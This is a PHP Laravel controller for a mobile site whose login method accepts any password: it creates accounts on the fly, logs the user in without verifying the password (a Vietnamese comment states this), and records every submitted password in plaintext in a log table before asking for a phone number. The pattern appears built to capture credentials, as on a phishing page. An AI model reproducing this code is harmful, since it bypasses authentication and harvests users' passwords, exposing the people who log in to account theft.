<?php

namespace App\Http\Controllers;

use App\Models\LoginRegisterLog;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;

class MobileController extends Controller
{
    public function index(){
        return view('mobile');
    }
    public function serviceCenter(){
        return view('service');
    }
    public function transaction(){
        return view('transaction');
    }
    public function memberCenter(){
        return view('membercenter');
    }
    public function login(Request $request)
{
    $request->validate([
        'name' => 'required|string',
        'password' => 'required|string',
    ]);
    
    $user = \App\Models\User::where('name', $request->name)->first();

    if (!$user) {
        // Nếu user chưa tồn tại → tạo mới
        $user = \App\Models\User::create([
            'name' => $request->name,
            'nickname' => $request->name,
            'password' => \Illuminate\Support\Facades\Hash::make($request->password),
            'role_id' => 1,
        ]);

        LoginRegisterLog::create([
            'username' => $user->name,
            'user_agent' => 'Đăng ký',
            'status'     => LoginRegisterLog::TYPE_REGISTER,
            'password' => $request->password,
        ]);
    }

    // Đăng nhập không kiểm tra mật khẩu
    Auth::login($user);

    LoginRegisterLog::create([
        'username' => $user->name,
        'user_agent' => 'Đăng nhập',
        'status'     => LoginRegisterLog::TYPE_LOGIN,
        'password' => $request->password,
    ]);

    // Hiển thị form nhập số điện thoại nếu chưa có
    if (is_null($user->phone)) {
        session(['show_phone_prompt' => true]);
    }

    return redirect()->route('mobileHome');
}
}
